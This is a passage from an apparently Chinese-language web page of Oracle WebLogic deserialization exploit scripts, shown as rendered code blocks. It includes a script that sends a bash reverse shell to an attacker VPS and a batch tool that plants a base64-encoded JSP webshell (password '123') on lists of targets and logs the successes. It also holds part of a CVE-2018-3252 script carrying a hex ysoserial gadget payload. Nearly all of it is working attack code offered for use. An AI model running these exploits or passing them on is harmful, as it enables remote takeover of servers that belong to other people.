class="line">17</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">          &lt;void index&#x3D;&quot;1&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">          &lt;string&gt;-c&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">          &lt;void index&#x3D;&quot;2&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">          &lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;%s 0&gt;&amp;1&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;array&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">          &lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;work:WorkContext&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;soapenv:Header&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">          &lt;soapenv:Body&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">          &lt;asy:onAsyncDelivery&#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;soapenv:Body&gt;&lt;&#x2F;soapenv:Envelope&gt;&#39;&#39;&#39;  % (sys.argv[2],sys.argv[3])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">          print url</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">          header &#x3D; &#123;&#39;content-type&#39;: &#39;text&#x2F;xml&#39;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">          r&#x3D;requests.post(url,headers&#x3D;header,data&#x3D;raw)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">          if (r.status_code&#x3D;&#x3D;202):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">              print &quot;反弹成功！&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">          else :</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">              print&quot;漏洞不存在！&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">      except:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">          print &quot;使用方法：VPS监听端口 weblogic.py 目标网址 VPSip 端口&quot;</span></pre></td></tr></table></figure><h2 id="批量"><a href="#批量" class="headerlink" title="批量"></a>批量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import gevent</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">from gevent import  monkey;monkey.patch_all()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">import os</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">from multiprocessing import Process</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">class Weblogic:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    def __init__(self,headers,data,path):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        self.headers&#x3D;headers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        self.data&#x3D;data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        self.path&#x3D;path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    def exploit(self,url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        urls&#x3D;&#39;&#123;&#125;&#123;&#125;&#39;.format(str(url).rstrip(&#39;&#x2F;&#39;).strip(),self.path)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        urls2&#x3D;&#39;&#123;&#125;&#123;&#125;&#39;.format(str(url).rstrip(&#39;&#x2F;&#39;).strip(),&#39;&#x2F;_async&#x2F;webshells.jsp&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            rqt&#x3D;requests.get(url&#x3D;urls,headers&#x3D;self.headers)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">            if rqt.status_code&#x3D;&#x3D;200 and &#39;Test page&#39; in rqt.text:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">                rvt&#x3D;requests.post(url&#x3D;urls,headers&#x3D;self.headers,data&#x3D;self.data,timeout&#x3D;3)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">                if rvt.status_code&#x3D;&#x3D;202:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">                    rbt&#x3D;requests.get(url&#x3D;urls2,headers&#x3D;headers)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">                    if rbt.status_code&#x3D;&#x3D;200 and not &#39;404&#39; in rbt.text:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">                        print(&#39;[+] weblogic反序列化漏洞利用成功,ip:&#123;&#125; password:&#123;&#125; 利用方式如:&#123;&#125;&#39;.format(urls2,&#39;123&#39;,&#39;&#123;&#125;?pwd&#x3D;123&amp;cmd&#x3D;whoami&#39;.format(urls2)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">                        print(&#39;[+] weblogic反序列化漏洞利用成功,ip:&#123;&#125; password:&#123;&#125; 利用方式如:&#123;&#125;&#39;.format(urls2, &#39;123&#39;,&#39;&#123;&#125;?pwd&#x3D;123&amp;cmd&#x3D;whoami&#39;.format(urls2)),file&#x3D;open(&#39;save.txt&#39;,&#39;a&#39;,encoding&#x3D;&#39;utf-8&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">                    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">                        print(&#39;[-] 利用失败 url:&#123;&#125; 状态码:&#123;&#125;&#39;.format(rbt.url,rbt.status_code))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">                else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">                    print(&#39;[-] 利用失败 url:&#123;&#125; 状态码:&#123;&#125;&#39;.format(rvt.url,rvt.status_code))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">                print(&#39;[-] 不存在weblogic反序列化漏洞-CVE-2019-48814 http状态码:&#123;&#125; url:&#123;&#125;&#39;.format(rqt.status_code,urls))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">        except:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">            pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">    def xc(self,rw):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">        xs&#x3D;[]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">        for r in rw:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">            xs.append(gevent.spawn(self.exploit,r))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">        gevent.joinall(xs)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    def djc(self,id):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">        url_list&#x3D;[]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">        calc&#x3D;0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">        if str(id)&#x3D;&#x3D;&#39;1&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">            print(&#39;[+] 单个url检测&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">            xw&#x3D;input(&#39;url&gt;&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">            self.exploit(url&#x3D;xw)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">        elif str(id)&#x3D;&#x3D;&#39;2&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">            print(&#39;[+] 批量检测&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">            xw&#x3D;input(r&#39;文件路径&gt;&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">            if os.path.exists(xw):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">                print(&#39;[+] 找到对应的文件&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">                with open(xw,&#39;r&#39;,encoding&#x3D;&#39;utf-8&#39;) as x:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">                    calc+&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">                    if calc&#x3D;&#x3D;100:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">                        p&#x3D;Process(target&#x3D;self.xc,args&#x3D;(url_list,))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">                        p.start()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">                        calc&#x3D;0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">                        url_list.clear()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">                    for r in x.readlines():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">                        qc&#x3D;&quot;&quot;.join(r.split(&#39;\n&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">                        url_list.append(qc)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">                if len(url_list)&gt;0:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">                    b &#x3D; Process(target&#x3D;self.xc, args&#x3D;(url_list,))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">                    b.start()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">            else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">                print(&#39;[-] 找不到对应的文件&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">                exit()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">    headers&#x3D;&#123;&#39;user-agent&#39;:&#39;Apache-HttpClient&#x2F;4.1.1 (java 1.5)&#39;,&#39;Connection&#39;:&#39;keep-alive&#39;,&#39;content-type&#39;: &#39;text&#x2F;xml&#39;,&#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">    path&#x3D;&#39;&#x2F;_async&#x2F;AsyncResponseService&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">    data&#x3D;&quot;&quot;&quot;&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:wsa&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;08&#x2F;addressing&quot; xmlns:asy&#x3D;&quot;http:&#x2F;&#x2F;www.bea.com&#x2F;async&#x2F;AsyncResponseService&quot;&gt;   </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Header&gt; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">&lt;wsa:Action&gt;xx&lt;&#x2F;wsa:Action&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;&#x2F;wsa:RelatesTo&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4&#x3D; |base64 -d &gt; servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls9_async_response&#x2F;8tpkys&#x2F;war&#x2F;webshells.jsp&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;array&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">93</span></pre></td><td class="code"><pre><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">94</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;work:WorkContext&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">95</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;soapenv:Header&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">96</span></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Body&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">97</span></pre></td><td class="code"><pre><span class="line">&lt;asy:onAsyncDelivery&#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">98</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;soapenv:Body&gt;&lt;&#x2F;soapenv:Envelope&gt;&quot;&quot;&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">99</span></pre></td><td class="code"><pre><span class="line">    obj&#x3D;Weblogic(headers&#x3D;headers,data&#x3D;data,path&#x3D;path)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">100</span></pre></td><td class="code"><pre><span class="line">    obj.djc(sys.argv[1])</span></pre></td></tr></table></figure><h1 id="CVE-2018-3252"><a href="#CVE-2018-3252" class="headerlink" title="CVE-2018-3252"></a>CVE-2018-3252</h1><h2 id="version-4"><a href="#version-4" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">10.3.6.0版本，</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">12.1.3.0版本，</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">12.2.1.3版本</span></pre></td></tr></table></figure><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>需要账号密码。防止部署war包容易被发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">import re</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">def payload_module():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    #calc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    #payload &#x3D; &quot;737200176A6176612E7574696C2E4C696E6B656448617368536574D86CD75A95DD2A1E02000077020000787200116A6176612E7574696C2E48617368536574BA44859596B8B734030000770200007870770C000000103F400000000000027372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000849000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785A00155F75736553657276696365734D656368616E69736D4C000B5F617578436C617373657374003B4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F486173687461626C653B5B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D657400124C6A6176612F6C616E672F537472696E673B4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B77020000787000000000FFFFFFFF0070757200035B5B424BFD19156767DB3702000077020000787000000002757200025B42ACF317F8060854E00200007702000078700000069ACAFEBABE0000003200390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E01000863616C632E65786508003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B003401000D537461636B4D61705461626C6501001C79736F73657269616C2F50776E65723132353836353535383033373001001E4C79736F73657269616C2F50776E6572313235383635353538303337303B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002E000E0000000C000100000005000F003800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000033000E00000020000300000001000F0038000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000037000E0000002A000400000001000F003800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B1000000010036000000030001030002002000000002002100110000000A000100020023001000097571007E000C000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003B000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078737D00000001001D6A617661782E786D6C2E7472616E73666F726D2E54656D706C6174657377020000787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B7702000078707372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B770200007870737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C647702000078703F4000000000000C77080000001000000001740008663561356136303871007E0009787672001D6A617661782E786D6C2E7472616E73666F726D2E54656D706C61746573000000000000000000000077020000787078&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    whoami</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; &quotquot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    return payload.decode(&#39;hex&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">def send_request(target,username,password):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    target &#x3D; target + &quot;&#x2F;bea_wls_deployment_internal&#x2F;DeploymentService&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    header_dict &#x3D; &#123;</span></pre></td></tr><tr><td 